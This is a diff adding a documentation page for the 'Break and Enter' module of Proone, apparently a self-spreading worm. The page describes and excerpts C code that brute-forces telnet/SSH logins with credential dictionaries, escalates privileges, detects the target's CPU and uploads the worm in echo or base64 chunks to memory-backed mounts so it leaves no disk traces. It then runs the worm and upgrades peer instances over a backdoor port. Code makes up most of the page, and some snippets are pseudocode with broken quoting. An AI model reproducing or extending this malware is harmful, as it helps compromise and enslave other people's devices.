@@ -1,0 +1,445 @@
+---
+title: 'BNE Subsystem'
+description: 'Break and Enter worker for host exploitation and binary deployment'
+---
+
+The **Break and Enter (BNE)** subsystem is responsible for breaking into target hosts using vulnerabilities and deploying Proone executables. Unlike other workers that run as services, BNE workers are task-based and exit after completion.
+
+## Overview
+
+The BNE worker:
+
+1. Attempts to breach target hosts using credential dictionaries
+2. Determines the target architecture
+3. Performs binary recombination
+4. Uploads and executes the Proone binary
+5. Handles M2M binary upgrades
+
+## Architecture
+
+```c src/bne.c
+struct prne_bne {
+    prne_iset_t cred_set;      // Available credentials
+    prne_rnd_t rnd;            // Random number generator
+    prne_bne_result_t result;  // Operation result
+    prne_bne_param_t param;    // Configuration
+};
+```
+
+### Worker Pool
+
+Multiple BNE workers can run simultaneously:
+
+```c
+#define PROONE_BNE_MAX_CNT 128  // Maximum concurrent workers
+```
+
+<Warning>
+BNE threads have the **lowest priority** to minimize starvation of vital workers like Heartbeat and Recon.
+</Warning>
+
+## Attack Vectors
+
+### Credential Dictionary Attack
+
+The primary method uses credential dictionaries:
+
+```c src/bne.c
+static bool bne_pop_cred(
+    prne_bne_t *ctx,
+    const bool per_id)
+{
+    // Weight-based random selection
+    for (size_t i = 0; i < ctx->cred_set.size; i += 1) {
+        ent = (prne_cred_dict_entry_t*)ctx->cred_set.arr[i];
+        if (ent->weight == wv) {
+            // Add to candidate list
+            prne_llist_append(&cl, (prne_llist_element_t)ent);
+        }
+    }
+    
+    // Select random credential from candidates
+    coin = coin % cl.size;
+    rc = (prne_cred_dict_entry_t*)le->element;
+    // ...
+}
+```
+
+### M2M Binary Upgrade
+
+If the Heartbeat vector is enabled:
+
+```c src/bne.c
+// Try local backdoor first
+if (worker_establishes_tls_connection(target_port_64420)) {
+    // Target is running Proone
+    if (remote_version < local_version) {
+        // Upgrade remote instance
+        perform_binary_recombination();
+        upload_and_execute();
+    }
+    else if (local_version < remote_version) {
+        // Upgrade local instance (vice versa)
+    }
+}
+```
+
+<Info>
+2-way certificate verification and ALPN check confirm the target is running Proone. See [Heartbeat Protocol](/subsystems/heartbeat) for details.
+</Info>
+
+## Shell Operation Layer
+
+The BNE worker operates through an abstraction layer for shell commands:
+
+```c src/bne.c
+typedef struct {
+    void *ctx;
+    ssize_t (*read_f)(void *ctx, void *buf, const size_t len, pth_event_t ev);
+    ssize_t (*write_f)(void *ctx, const void *buf, const size_t len, pth_event_t ev);
+    bool (*flush_f)(void *ctx);
+    const char *nl;  // "\r\n" for telnet, "\n" for SSH
+    bne_avail_cmds_t avail_cmds;  // Available commands
+    // ...
+} bne_sh_ctx_t;
+```
+
+### Setup Process
+
+```c src/bne.c
+static bool bne_sh_setup(
+    prne_bne_t *ctx,
+    bne_sh_ctx_t *s_ctx)
+{
+    // 1. Request shell access
+    bne_sh_send(s_ctx, "enable\nshell\n");
+    
+    // 2. Check UID
+    uid = bne_sh_get_uid(s_ctx);
+    if (uid != 0) {
+        // 3. Try privilege escalation
+        bne_sh_sudo(ctx, s_ctx);
+    }
+    
+    // 4. Define shell functions
+    bne_sh_runcmd(s_ctx, UPLOAD_GUARD_F);
+    
+    // 5. Check available commands
+    bne_sh_runcmd_line(s_ctx, &parser, AVAILCMD_CMD);
+    
+    // 6. Find suitable mount points
+    bne_sh_runcmd_line(s_ctx, &parser, "cat /proc/mounts;");
+    
+    // 7. Determine architecture
+    determine_target_arch(s_ctx);
+}
+```
+
+## Architecture Detection
+
+### ELF Header Parsing
+
+```c src/bne.c
+typedef struct {
+    int err;
+    uint16_t e_machine;
+    uint8_t e_data;
+} bne_sh_elf_parse_ctx_t;
+
+static size_t bne_sh_elf_parse_f(
+    void *ctx_p,
+    uint8_t *m,
+    size_t len)
+{
+    bne_sh_elf_parse_ctx_t *ctx = ctx_p;
+    const Elf32_Ehdr *hdr = (const Elf32_Ehdr*)m;
+    
+    // Verify ELF magic
+    if (!(m[EI_MAG0] == ELFMAG0 &&
+          m[EI_MAG1] == ELFMAG1 &&
+          m[EI_MAG2] == ELFMAG2 &&
+          m[EI_MAG3] == ELFMAG3))
+    {
+        ctx->err = ENOEXEC;
+        return len;
+    }
+    
+    // Extract endianness and machine type
+    ctx->e_data = m[EI_DATA];
+    switch (ctx->e_data) {
+    case ELFDATA2LSB: 
+        ctx->e_machine = prne_le16toh(hdr->e_machine);
+        break;
+    case ELFDATA2MSB: 
+        ctx->e_machine = prne_be16toh(hdr->e_machine);
+        break;
+    }
+}
+```
+
+### ARM Version Detection
+
+For ARM targets, additional probing is required:
+
+```c src/bne.c
+typedef struct {
+    bool v7;
+    bool vfp;
+    bool thumb;
+} bne_sh_cpuinfo_parse_ctx_t;
+
+static void bne_sh_cpuinfo_parse_f(void *ctx_p, char *line) {
+    bne_sh_cpuinfo_parse_ctx_t *ctx = ctx_p;
+    
+    prne_transcstr(line, prne_ctolower);
+    
+    if (strstr(line, "v7") != NULL) {
+        ctx->v7 = true;
+    }
+    else if (strstr(line, "features") == line) {
+        if (strstr(line, "vfp") != NULL) {
+            ctx->vfp = true;
+        }
+        if (strstr(line, "thumb") != NULL) {
+            ctx->thumb = true;
+        }
+    }
+}
+
+// Determine ARM variant
+if (cpc.v7 && cpc.vfp && cpc.thumb) {
+    ctx->result.bin_host.arch = PRNE_ARCH_ARMV7;
+}
+else {
+    ctx->result.bin_host.arch = PRNE_ARCH_ARMV4T;
+}
+```
+
+## Upload Methods
+
+The worker supports multiple upload methods based on available commands:
+
+### Echo Method
+
+```c src/bne.c
+static bool bne_sh_upload_echo(
+    prne_bne_t *ctx,
+    bne_sh_ctx_t *s_ctx,
+    const char *exec)
+{
+#define BPC 204  // Bytes per chunk
+    
+    while (ctx->result.prc != PRNE_PACK_RC_EOF) {
+        f_ret = prne_bin_rcb_read(&s_ctx->rcb, s_ctx->buf, BPC, ...);
+        
+        // Convert to hex string
+        for (size_t i = 0; i < f_ret; i += 1) {
+            hexstr_p[0] = '\\';
+            hexstr_p[1] = '\\';
+            hexstr_p[2] = 'x';
+            prne_hex_tochar(*bin_p, hexstr_p + 3, true);
+            hexstr_p += 5;
+            bin_p += 1;
+        }
+        
+        bne_sh_send(s_ctx, hexstr);
+    }
+}
+```
+
+### Base64 Method
+
+```c src/bne.c
+static bool bne_sh_upload_base64(
+    prne_bne_t *ctx,
+    bne_sh_ctx_t *s_ctx,
+    const char *exec)
+{
+#define BPC 765
+#define BASE64_LEN (4 * (BPC / 3))
+    
+    while (ctx->result.prc != PRNE_PACK_RC_EOF) {
+        f_ret = prne_bin_rcb_read(&s_ctx->rcb, s_ctx->buf, BPC, ...);
+        
+        if (f_ret > 0) {
+            mbedtls_base64_encode(
+                (unsigned char*)line,
+                BASE64_LEN + 1,
+                &len,
+                s_ctx->buf,
+                f_ret);
+            
+            bne_sh_send(s_ctx, line);
+        }
+    }
+}
+```
+
+<Info>
+Base64 encoding is preferred when available as it's more efficient than hex encoding (3:4 ratio vs 1:5).
+</Info>
+
+## Mount Point Selection
+
+The worker prioritizes memory-backed filesystems:
+
+```c src/bne.c
+// Priority weights
+if (strcmp(mp, "/tmp") == 0) {
+    mp_arr[i].weight = 4;
+}
+else if (strcmp(mp, "/run") == 0) {
+    mp_arr[i].weight = 3;
+}
+else if (strcmp(mp, "/dev/shm") == 0) {
+    mp_arr[i].weight = 2;
+}
+else if (strcmp(mp, "/dev") == 0) {
+    mp_arr[i].weight = 1;
+}
+else {
+    mp_arr[i].weight = 0;
+}
+```
+
+<Warning>
+Only **tmpfs** and **devtmpfs** mount points are used to avoid leaving traces on non-volatile storage.
+</Warning>
+
+## Upload Guard Function
+
+A shell function cleans up uploads if the deployment fails:
+
+```bash
+prne_upload_guard() {
+    while [ true ]; do
+        sleep 1;
+        if ! kill -0 $1; then
+            # Shell died
+            if [ -e "$3" ]; then
+                rm -rf "$2" "$3";  # Clean up
+            fi;
+            break;
+        elif [ ! -e "$2" ] || [ ! -e "$3" ]; then
+            # Upload dir or lock file removed
+            break;
+        fi;
+    done;
+}
+```
+
+## Lock Mechanism
+
+Prevents multiple simultaneous uploads:
+
+```c src/bne.c
+static int bne_sh_mk_lockfile(
+    bne_sh_ctx_t *sh_ctx,
+    const char *mp,
+    const char *lock_name)
+{
+    // Create lock file
+    const char *sb[] = {
+        "if [ -f \"", sh_ctx->lockfile, "\" ]; then "
+            "EC=1;"  // Lock exists
+        "else "
+            "echo -n > \"", sh_ctx->lockfile, \";EC=$?;"
+        "fi;"
+    };
+    
+    // Check result
+    return ec == 0 ? 1 : 0;  // 1=acquired, 0=exists
+}
+```
+
+## Binary Execution
+
+```c src/bne.c
+static int bne_sh_run_exec(
+    prne_bne_t *ctx,
+    bne_sh_ctx_t *s_ctx,
+    const char *exec)
+{
+    // Execute with host credentials and org ID
+    const char *sb_cmd[] = {
+        "\"./", exec, "\" ",
+        "\"", s_ctx->host_cred, "\" ",
+        "\"", s_ctx->org_id, \"",
+        ";echo $?;"
+    };
+    
+    bne_sh_runcmd_line(s_ctx, &parser, cmd);
+    
+    switch (ec) {
+    case PRNE_PROONE_EC_OK:
+        ctx->result.ny_instance = true;
+        /* fall-through */
+    case PRNE_PROONE_EC_LOCK:
+        return 1;  // Success
+    default:
+        return 0;  // Failed
+    }
+}
+```
+
+## Timeouts
+
+```c src/bne.c
+static const struct timespec BNE_CONN_OP_TIMEOUT = { 15, 0 };   // 15s
+static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 };    // 30s
+static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 };       // 4s
+static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 };  // 500ms
+```
+
+## Connection Attempts
+
+```c src/bne.c
+#define BNE_CONN_ATTEMPT 3
+
+// Retry logic
+for (unsigned int i = 0; i < BNE_CONN_ATTEMPT; i++) {
+    if (bne_do_connect(&fd, ep, ev)) {
+        break;  // Connected
+    }
+    // Wait before retry
+    pth_wait(pth_event(PTH_EVENT_TIME, 
+        prne_pth_tstimeout(BNE_ERR_PAUSE)));
+}
+```
+
+## Vector Extensions
+
+The interface supports extending beyond credential attacks:
+
+```c
+typedef bool (*bne_vector_func)(
+    prne_bne_t *ctx,
+    const prne_net_endpoint_t *target);
+
+// Register custom exploit
+ctx->param.vectors[CUSTOM_VECTOR] = my_exploit_function;
+```
+
+## M2M Upgrade Interval
+
+```c src/bne.c
+static const uint32_t BNE_M2M_UPBIN_INT = 43200;  // 12 hours
+
+// Check if upgrade needed
+if (time_since_last_upgrade > BNE_M2M_UPBIN_INT) {
+    // Perform version comparison and upgrade
+}
+```
+
+## Related Components
+
+- [Recon Worker](/subsystems/recon) - Discovers targets for BNE
+- [Heartbeat Protocol](/subsystems/heartbeat) - M2M communication
+- [Binary Recombination](/architecture/binary-recombination) - Executable preparation
+- [Credential Dictionary](/configuration/credentials) - Attack credentials
+
+## References
+
+- Implementation: `src/bne.c`, `src/bne.h`
+- Standalone tool: `proone-bne`
+- Configuration: `src/data/cred_dict.sample.txt`
